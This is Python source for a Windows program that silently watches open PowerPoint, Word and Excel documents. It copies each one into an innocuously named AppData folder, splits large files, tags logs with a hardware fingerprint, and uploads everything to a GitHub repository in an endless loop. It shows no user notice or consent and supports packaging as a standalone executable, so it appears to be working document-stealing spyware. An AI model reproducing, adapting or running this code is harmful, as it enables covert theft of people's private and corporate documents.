import os
import sys
import time
import json
import queue
import xlwings as xw
import shutil
import hashlib
import platform
import datetime
import base64
import subprocess
import win32com.client
from github import Github
from cryptography.fernet import Fernet

DEFAULT_CONFIG = {
    "repo_name": "your_repo_name",
    "github_token": "enter_your_github_token_here",
    "retry_interval": 10,
    "check_interval": 30
}

if getattr(sys, 'frozen', False): # For pyinstaller
    script_dir = os.path.dirname(sys.executable)
else:
    script_dir = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(script_dir, "config.json")
PASSWORD = "Enter_your_password_here"
current_date = datetime.datetime.now().strftime("%Y.%m.%d")
key = base64.urlsafe_b64encode(hashlib.sha256(PASSWORD.encode()).digest())
appdata_path = os.getenv('APPDATA')
repo_path = os.path.join(appdata_path, "OfficeDispatch")
LOG_FILE_PATH = os.path.join(repo_path, current_date, f'{current_date}.log')
cipher_suite = Fernet(key)
upload_queue = queue.Queue()

log_initialized = False

def log_message(message, log_file_path=LOG_FILE_PATH):
    global log_initialized
    log_dir = os.path.dirname(log_file_path)
    os.makedirs(log_dir, exist_ok=True)

    if not log_initialized:
        if os.path.exists(log_file_path) and os.path.getsize(log_file_path) > 0:
            with open(log_file_path, 'a', encoding='utf-8') as log:
                log.write('\n')
        log_initialized = True
    print(message)
    with open(log_file_path, "a", encoding='utf-8') as log_file:
        log_file.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")

def validate_config_value(key, value):
    if key in ["retry_interval", "check_interval"]:
        return isinstance(value, int) and value > 0
    elif key in ["repo_name", "github_token"]:
        return isinstance(value, str) and len(value) > 0
    return True

def encrypt_token(token):
    return cipher_suite.encrypt(token.encode()).decode()

def decrypt_token(encrypted_token):
    return cipher_suite.decrypt(encrypted_token.encode()).decode()

def load_config():
    log_message('Loading Config...')
    config = DEFAULT_CONFIG.copy()
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
                user_config = json.load(f)
            for key, default_value in DEFAULT_CONFIG.items():
                if key in user_config:
                    if validate_config_value(key, user_config[key]):
                        config[key] = user_config[key]
                    else:
                        log_message(f'Invalid value for {key}: {user_config[key]}. Resetting to default value.')
                else:
                    log_message(f'Missing key {key}. Resetting to default value.')
            if "github_token" in config:
                if config["github_token"].startswith("ghp_"):
                    encrypted_token = encrypt_token(config["github_token"])
                    config["github_token"] = config["github_token"]
                    user_config["github_token"] = encrypted_token
                    with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
                        json.dump(user_config, f, ensure_ascii=False, indent=4)
                else:
                    try:
                        decrypted_token = decrypt_token(config["github_token"])
                        if "ghp_" in decrypted_token:
                            config["github_token"] = decrypted_token
                        else:
                            log_message("Decrypted token does not contain 'ghp_'. Terminating script.")
                            raise ValueError("Decryption failed")
                    except Exception as e:
                        log_message(f"Failed to decrypt GitHub token: {e}. Terminating script.")
                        raise ValueError("Decryption failed")
        except (json.JSONDecodeError, ValueError) as e:
            log_message(f'Error loading config: {e}. Resetting invalid entries to default values.')
            with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
                json.dump(config, f, ensure_ascii=False, indent=4)
    else:
        with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
            log_message(f'Creating new config file: {CONFIG_PATH}')
            json.dump(config, f, ensure_ascii=False, indent=4)
    log_message('Config loaded successfully.')
    return config

try:
    config = load_config()
except ValueError:
    print("Script terminated due to decryption failure.")
    exit(1)

def initialize_com_object(app_name):
    attempt = 0
    while attempt < config['retry_interval']:
        try:
            app = win32com.client.Dispatch(app_name)
            return app
        except Exception as e:
            log_message(f"Error initializing {app_name}: {e}. Retrying in {config['retry_interval']} seconds...")
            time.sleep(config['retry_interval'])
            attempt += 1
    return None

ppt = initialize_com_object("PowerPoint.Application")
word = initialize_com_object("Word.Application")
os.makedirs(repo_path, exist_ok=True)
processed_files = set()

def calculate_md5(file_path):
    hash_md5 = hashlib.md5()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def split_and_compress_file(file_path, output_dir, volume_size=25*1024*1024):
    base_name = os.path.basename(file_path)
    os.makedirs(output_dir, exist_ok=True)
    archive_path = os.path.join(output_dir, base_name)
    archive_name = os.path.join(archive_path, base_name + ".7z")
    try:
        volume_size_mb = volume_size // (1024 * 1024)
        zip = [
            '7z', 'a', '-v{}m'.format(volume_size_mb), '-mx=1', archive_name, file_path
        ]
        subprocess.run(zip, shell=True)
        part_file_paths = [os.path.join(archive_path, f) for f in os.listdir(archive_path) if f.startswith(base_name)]

        info_path = os.path.join(archive_path, "info.json")
        info_data = {
            "original_file_path": file_path,
            "original_file_size": os.path.getsize(file_path),
            "part_count": len(part_file_paths),
            "parts": [{"part_number": i+1, "part_size": os.path.getsize(part_file)} for i, part_file in enumerate(part_file_paths)]
        }
        with open(info_path, 'w') as info_file:
            json.dump(info_data, info_file, indent=4)

        log_message(f"File {file_path} is too large, split and compressed into {archive_path} with {len(part_file_paths)} parts", LOG_FILE_PATH)
        for part_file_path in part_file_paths:
            upload_queue.put(part_file_path)
        
        processed_files.add(file_path)
    except subprocess.CalledProcessError as e:
        log_message(f"Failed to compress {file_path} with error: {e}", LOG_FILE_PATH)

def copy_file(file_name, file_size, category, target_folder, log_file_path=LOG_FILE_PATH):
    try:
        dest_folder = os.path.join(target_folder, category)
        if file_size > 25 * 1024 * 1024:
            split_and_compress_file(file_name, dest_folder)
        else:
            dest_file_path = os.path.join(dest_folder, os.path.basename(file_name))
            if os.path.exists(dest_file_path) and calculate_md5(file_name) == calculate_md5(dest_file_path):
                log_message(f"File {file_name} already exists and is identical, skipping copy", log_file_path)
                return False
            shutil.copy(file_name, dest_folder)
            log_message(f"Copied {file_name} to {dest_folder} successfully", log_file_path)
            upload_queue.put(dest_file_path)
            processed_files.add(file_name)
        return True
    except Exception as e:
        log_message(f"Failed to copy {file_name} due to {e}", log_file_path)
        return False
    
def refresh_com_object(app_name):
    try:
        app = win32com.client.Dispatch(app_name)
        return app
    except Exception as e:
        log_message(f"Error initializing {app_name}: {e}")
        return None
    
def process_files():
    try:
        target_folder = os.path.join(repo_path, current_date)
        for folder in ["PowerPoint", "Excel", "Word"]:
            os.makedirs(os.path.join(target_folder, folder), exist_ok=True)
        for main_folder in ["PowerPoint", "Excel", "Word"]:
            main_folder_path = os.path.join(target_folder, main_folder)
            for subfolder in os.listdir(main_folder_path):
                subfolder_path = os.path.join(main_folder_path, subfolder)
                if os.path.isdir(subfolder_path):
                    info_path = os.path.join(subfolder_path, "info.json")
                    if os.path.exists(info_path):
                        with open(info_path, 'r') as info_file:
                            info_data = json.load(info_file)
                            processed_files.add(info_data["original_file_path"])
        office_apps = [
            (ppt, "PowerPoint", lambda app: app.Presentations, lambda pres: pres.FullName),
            (xw.apps.active, "Excel", lambda app: app.books, lambda book: book.fullname),
            (word, "Word", lambda app: app.Documents, lambda doc: doc.FullName)
        ]

        for app, folder_name, get_items, get_filename in office_apps:
            if app:
                for item in get_items(app):
                    file_name = os.path.abspath(get_filename(item))
                    if file_name not in processed_files:
                        processed_files.add(file_name)
                        file_size = os.path.getsize(file_name)
                        if copy_file(file_name, file_size, folder_name, target_folder):
                            continue
        return LOG_FILE_PATH
    except Exception as e:
        if hasattr(e, 'args') and "PowerPoint.Application.Presentations" in e.args:
            print("PowerPoint Application Presentations error:", e, "[This error can be ingored]")
            return None
        if hasattr(e, 'args') and any("-2147023174" in str(arg) for arg in e.args):
            print("RPC server unavailable error:", e)
            return None
        log_message(f"Error in processing files: {e}")
    return None

def get_hwid():
    processor = platform.processor()
    system_version = platform.version()
    machine = platform.machine()
    node = platform.node()
    hwid_source = f"{processor}_{system_version}_{machine}_{node}"
    hwid = hashlib.sha256(hwid_source.encode()).hexdigest()
    return hwid

def check_and_rename_previous_logs():
    current_date = datetime.datetime.now().strftime("%Y.%m.%d")
    last_uploaded_file = os.path.join(repo_path, 'last_uploaded_date.txt')
    if os.path.exists(last_uploaded_file):
        with open(last_uploaded_file, 'r') as f:
            start_date = f.read().strip()
    else:
        start_date = (datetime.datetime.now() - datetime.timedelta(days=1)).strftime("%Y.%m.%d")
        with open(last_uploaded_file, 'w') as f:
            f.write(start_date)
    
    while start_date < current_date:
        log_folder = os.path.join(repo_path, start_date)
        if os.path.exists(log_folder):
            hwid = get_hwid()
            log_file = os.path.join(log_folder, f'{start_date}.log')
            if os.path.exists(log_file):
                new_log_file = os.path.join(log_folder, f"{start_date}_{hwid}.log")
                if not os.path.exists(new_log_file):
                    os.rename(log_file, new_log_file)
                    upload_queue.put(new_log_file)
                    with open(last_uploaded_file, 'w') as f:
                        f.write(start_date)
                    return new_log_file, log_folder
        start_date = (datetime.datetime.strptime(start_date, "%Y.%m.%d") + datetime.timedelta(days=1)).strftime("%Y.%m.%d")
    return None, None

def upload_files_to_github(repo_name, token, upload_queue, log_file_path):
    g = Github(token)
    user = g.get_user()
    repo = user.get_repo(repo_name)

    while not upload_queue.empty():
        file_path = upload_queue.get()
        with open(file_path, "rb") as file:
            content = file.read()
        file_name = os.path.basename(file_path)
        full_rel_path = os.path.relpath(file_path, repo_path).replace("\\", "/")
        commit_message = f"Update {file_name}"

        attempt = 0
        success = False
        while attempt < config['retry_interval'] and not success:
            try:
                existing_file = repo.get_contents(full_rel_path)
                repo.update_file(
                    path=full_rel_path,
                    message=commit_message,
                    content=content,
                    sha=existing_file.sha,
                    branch="main"
                )
                log_message(f"Updated {full_rel_path}", log_file_path)
                success = True
            except Exception as e:
                if str(e).startswith('404'):
                    try:
                        repo.create_file(
                            path=full_rel_path,
                            message=commit_message,
                            content=content,
                            branch="main"
                        )
                        log_message(f"Uploaded {full_rel_path}", log_file_path)
                        success = True
                    except Exception as create_e:
                        log_message(f"Error uploading {full_rel_path}: {create_e}. Retrying...")
                        time.sleep(config['retry_interval'])
                        attempt += 1
                else:
                    log_message(f"Error updating {full_rel_path}: {e}. Retrying...")
                    time.sleep(config['retry_interval'])
                    attempt += 1

        if not success:
            log_message(f"Failed to process {full_rel_path} after multiple attempts.")
        upload_queue.task_done()

while True:
    ppt = refresh_com_object("PowerPoint.Application")
    word = refresh_com_object("Word.Application")
    log_file_path = process_files()
    if log_file_path:
        check_and_rename_previous_logs()
        upload_files_to_github(config['repo_name'], config['github_token'], upload_queue, log_file_path)
    time.sleep(config['check_interval'])
